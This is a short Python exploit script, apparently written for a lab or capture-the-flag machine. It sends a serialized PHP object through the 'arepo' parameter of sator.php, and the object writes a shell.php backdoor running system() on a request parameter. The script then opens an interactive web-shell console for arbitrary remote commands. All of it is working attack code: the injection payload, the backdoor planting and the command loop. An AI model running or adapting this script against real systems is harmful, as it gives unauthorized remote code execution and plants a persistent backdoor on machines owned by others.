#!/usr/bin/python

"""
coded by ShaNaCl 
"""

from sys import argv
import requests
import urllib.parse
import readline

payload = 'O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}'

def get_arg():
    if len(argv) != 2:
        print("Usage: ", argv[0], ' ip')
        exit(1)
    return argv[1]

def rce_console(s, t):
    while True:
        cmd = input("[>] ")
        cmd = urllib.parse.quote(cmd)
        response = s.get(f"http://{t}/shell.php?cmd={cmd}")
        print(response.text)


def main():
    target = get_arg()
    s = requests.session()
    url_payload = urllib.parse.quote(payload)
    url = f"http://{target}/sator.php?arepo={url_payload}"
    print("[*] Sending payload...")
    response = s.get(url)
    print("[*] Done!")
    print("[+] Checking...")
    php_backdoor_url = f"http://{target}//shell.php"
    response = s.get(php_backdoor_url)
    if response.status_code == 200:
        print("[*] Backdoor upload Successfully!")
        print("[*] Spawning web shell console")
        rce_console(s,target)
    else:
        print("[!] Something went wrong :(")
        exit(1)




if __name__ == '__main__':
    main()

